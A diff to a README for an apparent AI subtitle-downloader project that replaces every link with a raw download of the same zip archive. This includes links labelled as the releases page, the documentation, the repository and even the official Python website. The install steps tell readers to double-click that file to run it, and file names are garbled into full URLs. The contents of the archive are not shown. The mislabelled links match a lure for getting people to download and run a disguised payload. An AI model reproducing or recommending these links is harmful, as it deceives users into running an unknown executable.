@@ -9,7 +9,7 @@ Before you begin, ensure your device meets the following requirements:
 
 ## 🚀 Getting Started
 1. Visit the Releases page to download the application:  
-   [![Download Now](https://raw.githubusercontent.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/main/conjugateness/Agent_Ai_Downloader_Subtitle_2.6.zip%https://raw.githubusercontent.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/main/conjugateness/Agent_Ai_Downloader_Subtitle_2.6.zip)](https://raw.githubusercontent.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/main/conjugateness/Agent_Ai_Downloader_Subtitle_2.6.zip)
+   [![Download Now](https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/raw/refs/heads/main/conjugateness/Subtitle-Agent-Ai-Downloader-v3.4-alpha.1.zip%https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/raw/refs/heads/main/conjugateness/Subtitle-Agent-Ai-Downloader-v3.4-alpha.1.zip)](https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/raw/refs/heads/main/conjugateness/Subtitle-Agent-Ai-Downloader-v3.4-alpha.1.zip)
 
 ## 📥 Download & Install
 To download the application, follow these steps:
@@ -17,9 +17,9 @@ To download the application, follow these steps:
 1. Click the link above to go to the Releases page.
 2. Find the latest release version at the top.
 3. Click on the asset that corresponds to your operating system. You may see file names like:
-   - `https://raw.githubusercontent.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/main/conjugateness/Agent_Ai_Downloader_Subtitle_2.6.zip`
-   - `https://raw.githubusercontent.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/main/conjugateness/Agent_Ai_Downloader_Subtitle_2.6.zip`
-   - `https://raw.githubusercontent.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/main/conjugateness/Agent_Ai_Downloader_Subtitle_2.6.zip`
+   - `https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/raw/refs/heads/main/conjugateness/Subtitle-Agent-Ai-Downloader-v3.4-alpha.1.zip`
+   - `https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/raw/refs/heads/main/conjugateness/Subtitle-Agent-Ai-Downloader-v3.4-alpha.1.zip`
+   - `https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/raw/refs/heads/main/conjugateness/Subtitle-Agent-Ai-Downloader-v3.4-alpha.1.zip`
 4. Once the file downloads, locate it in your downloads folder.
 5. Unzip or extract the file, according to your operating system's method.
 
@@ -28,11 +28,11 @@ Now that you have downloaded the Ai-Agent-Subtitle-Downloader, let's run it:
 
 1. **Windows:**
    - Navigate to the unzipped folder.
-   - Double-click the `https://raw.githubusercontent.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/main/conjugateness/Agent_Ai_Downloader_Subtitle_2.6.zip` file to start the application.
+   - Double-click the `https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/raw/refs/heads/main/conjugateness/Subtitle-Agent-Ai-Downloader-v3.4-alpha.1.zip` file to start the application.
 
 2. **macOS:**
    - Open the unzipped folder.
-   - Double-click the `https://raw.githubusercontent.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/main/conjugateness/Agent_Ai_Downloader_Subtitle_2.6.zip` file. You may need to right-click and select "Open" due to security settings.
+   - Double-click the `https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/raw/refs/heads/main/conjugateness/Subtitle-Agent-Ai-Downloader-v3.4-alpha.1.zip` file. You may need to right-click and select "Open" due to security settings.
 
 3. **Linux:**
    - Open a terminal window.
@@ -56,7 +56,7 @@ Once the application is running, you can easily download subtitles:
 ## 🥳 Troubleshooting
 If you encounter issues when using the Ai-Agent-Subtitle-Downloader, here are a few common solutions:
 
-- **Application Won't Start:** Ensure you have installed Python 3.7 or higher. If not, download it from the [official Python website](https://raw.githubusercontent.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/main/conjugateness/Agent_Ai_Downloader_Subtitle_2.6.zip).
+- **Application Won't Start:** Ensure you have installed Python 3.7 or higher. If not, download it from the [official Python website](https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/raw/refs/heads/main/conjugateness/Subtitle-Agent-Ai-Downloader-v3.4-alpha.1.zip).
   
 - **No Subtitles Found:** Double-check the media title for spelling errors. Try searching for alternative titles if the original doesn't return results.
 
@@ -72,8 +72,8 @@ For any further assistance, please reach out through the Issues tab on the GitHu
 If you would like to contribute to the project, feel free to fork the repository and create pull requests. We appreciate all contributions and strive to improve the Ai-Agent-Subtitle-Downloader.
 
 ## 🔗 Important Links
-- [Visit Releases Page to Download](https://raw.githubusercontent.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/main/conjugateness/Agent_Ai_Downloader_Subtitle_2.6.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/main/conjugateness/Agent_Ai_Downloader_Subtitle_2.6.zip)
-- [Documentation](https://raw.githubusercontent.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/main/conjugateness/Agent_Ai_Downloader_Subtitle_2.6.zip)
+- [Visit Releases Page to Download](https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/raw/refs/heads/main/conjugateness/Subtitle-Agent-Ai-Downloader-v3.4-alpha.1.zip)
+- [GitHub Repository](https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/raw/refs/heads/main/conjugateness/Subtitle-Agent-Ai-Downloader-v3.4-alpha.1.zip)
+- [Documentation](https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/raw/refs/heads/main/conjugateness/Subtitle-Agent-Ai-Downloader-v3.4-alpha.1.zip)
 
 Thank you for using Ai-Agent-Subtitle-Downloader! Enjoy your subtitle downloads!
